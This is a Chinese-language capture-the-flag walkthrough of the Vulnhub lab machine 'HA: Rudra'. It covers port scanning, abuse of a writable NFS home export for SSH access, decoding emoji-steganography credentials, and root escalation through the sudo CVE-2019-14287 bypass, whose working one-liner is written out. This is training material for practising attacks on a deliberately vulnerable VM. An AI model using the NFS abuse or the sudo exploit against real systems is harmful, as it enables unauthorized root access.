---
layout: post
title: "Rudra walkthrough"
date: 2021-10-04
author: 2hanx
toc: true
categories: [Vulnhub]
tags: []
---

### 主机识别

`arp-scan -l`

### 网络拓扑

| 计算机        | IP                |
| ------------- | ----------------- |
| 本机（Win10） | `192.168.174.1`   |
| Kali          | `192.168.174.128` |
| Rudra         | `192.168.174.132` |

### 扫描端口和版本信息

`nmap -A -p- 192.168.174.132`

```shell
┌──(root💀kali)-[~]
└─# nmap -A -p- 192.168.174.132
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-04 07:45 EDT
Nmap scan report for 192.168.174.132
Host is up (0.00050s latency).
Not shown: 65527 closed ports
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d7:0d:45:dd:52:69:f9:54:2a:73:a7:d0:c5:ab:db:9b (RSA)
|   256 7f:cc:3c:a5:53:47:05:15:94:95:41:ea:5e:48:f1:00 (ECDSA)
|_  256 30:da:01:de:ab:d8:19:1e:fc:58:44:22:3b:29:33:cd (ED25519)
80/tcp    open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HA: Rudra
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      48311/udp   mountd
|   100005  1,2,3      51521/tcp   mountd
|   100005  1,2,3      52331/udp6  mountd
|   100005  1,2,3      58935/tcp6  mountd
|   100021  1,3,4      35919/tcp6  nlockmgr
|   100021  1,3,4      36327/udp   nlockmgr
|   100021  1,3,4      39665/tcp   nlockmgr
|   100021  1,3,4      42793/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
39665/tcp open  nlockmgr 1-4 (RPC #100021)
51521/tcp open  mountd   1-3 (RPC #100005)
56787/tcp open  mountd   1-3 (RPC #100005)
60335/tcp open  mountd   1-3 (RPC #100005)
MAC Address: 00:0C:29:0C:48:C9 (VMware)
```

访问网页没发现特殊的内容，直接进入目录枚举，发现 *robots.txt* 文件，内容是：`nandi.php`，访问该路径发现没有返回内容，再使用 *arjun* 工具枚举参数也没结果。本着存在即合理的原则 😂，应该是我的方式不对。

>之后查看源码才知道是存在LFI漏洞，并且参数是 `file`，嗯~(＃°Д°)

除了常见端口之外，还知道靶机开启了nfs服务，试试挂载在本地。

```shell
┌──(root💀kali)-[~]
└─# mount -t nfs 192.168.174.132:/home /mnt         
┌──(root💀kali)-[/mnt/shivay]
└─# ls
mahadev.txt
┌──(root💀kali)-[/mnt/shivay]
└─# cat mahadev.txt 
Rudra is another name of Lord Shiva. As per the vedic scriptures there are total 11 rudras. Of them, prominent one is Shiva. The other 10 rudras are considered as his expansions. As per Mahabharata, Srimad Bhagavatam and other vedic texts Lord Shiva appeared from Lord Brahma's eyebrows. Srimad Bhagvatam tells us why Lord Shiva is known as “Rudra”:
```

看到挂载的目录是在 `/home/shivay` 目录下，并且具备写入权限。因此接下来我们可以设置ssh免密登录，这个操作在之前文章中多次谈到，这里就不再赘述了。

### Getshell

Kali远程登录到 *shivay* 账户后进行简单的信息收集发现靶机上有三个可用用户：`mahakaal`、`rudra`、`shivay`。因为不知道 *shivay* 的密码，就看不到该账户的 *sudo* 权限，不过在查看数据库时，我们得到了一个提示。

```shell
shivay@ubuntu:/media$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 10
Server version: 5.7.27-0ubuntu0.18.04.1 (Ubuntu)

......

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mahadev            |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.01 sec)

mysql> select * from mahadev;
ERROR 1046 (3D000): No database selected
mysql> use mahadev;
Database changed
mysql> show tables;
+-------------------+
| Tables_in_mahadev |
+-------------------+
| hint              |
+-------------------+
1 row in set (0.00 sec)

mysql> select * from hint;
+---------------------------+
| hint                      |
+---------------------------+
| check on media filesystem |
+---------------------------+
1 row in set (0.00 sec)

mysql> quit
Bye
```

提示我们查看 `/media` 文件系统，那么切换到 `/media` 路径下，可以看到作者给出了密文文件和加密的参考文档。

```shell
shivay@ubuntu:/media$ ls
cdrom  creds  floppy  floppy0  hints
shivay@ubuntu:/media$ cat hints 
https://www.hackingarticles.in/cloakify-factory-a-data-exfiltration-tool-uses-text-based-steganography/   

without noise
shivay@ubuntu:/media$ ls
cdrom  creds  floppy  floppy0  hints
shivay@ubuntu:/media$ cat creds 
😴
😬
😥
😭
🐼
😬
🙈
😕
🐼
😬
🐵
😊
😀
😻
😥
😓
🐼
😅
😕
😕
😀
🙊
😾
😕
😝
😛
🙎
🙎
```

通过[这篇文章](https://www.hackingarticles.in/cloakify-factory-a-data-exfiltration-tool-uses-text-based-steganography/  )对密文进行解密，得到明文：`mahakaal:kalbhairav`，显而易见这是用户名和密码。

#### 提权

切换到 *mahakaal* 账户下，查看该账户的 *sudo* 权限，发现可以执行 `/usr/bin/watch`命令。

```shell
shivay@ubuntu:~$ su - mahakaal
Password: 
mahakaal@ubuntu:~$ id
uid=1001(mahakaal) gid=1001(mahakaal) groups=1001(mahakaal)
mahakaal@ubuntu:~$ sudo -l
[sudo] password for mahakaal: 
Matching Defaults entries for mahakaal on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mahakaal may run the following commands on ubuntu:
    (ALL, !root) /usr/bin/watch
```

不过注意到这里的 *sudo* 版本存在 CVE: 2019-14287 漏洞，可以进行本地提权。最后提权到 *root* 账户，得到flag。

```shell
ahakaal@ubuntu:~$ sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
mahakaal@ubuntu:~$ sudo -u#-1 watch -x sh -c 'reset; exec sh 1>&0 2>&0' -u
# id
uid=0(root) gid=1001(mahakaal) groups=1001(mahakaal)
# whoami
root
# cd /root
# ls
final.txt
# cat final.txt 


     .           ]@&L           .
      Jw         #@&&         zM
      '|$w      ,]@&$L      ,$\r
       k|$L     ]]@$$$     ,@|j
       ]@!$     j]@&$$W    $|p[
        @@j$   ]j]N&$$@   $@@@
        $&@B~  jj]B&$$@   @@$@
        #R&&[  `]]@&$$*  ]$$@N
        j%%@$    "@&M    ]RN%k
        |" 7$     $&     ]F%"|

......

!! Congrats you have finished this task !!

Contact us here:

Hacking Articles : https://twitter.com/rajchandel/
Aarti Singh: https://www.linkedin.com/in/aarti-singh-353698114/


+-+-+-+-+-+ +-+-+-+-+-+-+-+
 |E|n|j|o|y| |H|A|C|K|I|N|G|
 +-+-+-+-+-+ +-+-+-+-+-+-+-+
____________________________________
```



### 总结

1. `2049/tcp  open  nfs_acl` 是nsf服务，通过挂载命令查看内容：`mount -t nfs 192.168.174.132:/home /mnt`
2. 在常规操作搜索不到有用的信息时，试试查看数据库。
3. 看到存在 emoji 密文，试过[网站](http://www.atoolbox.net/Tool.php?Id=937)解密后是乱码，可搜索试试别的加密方案。
4. 小于 **1.8.28** 版本的 *sudo* 存在 CVE: 2019-14287 本地提权漏洞，命令为：`sudo -u#-1 <用户可执行的特殊程序>`

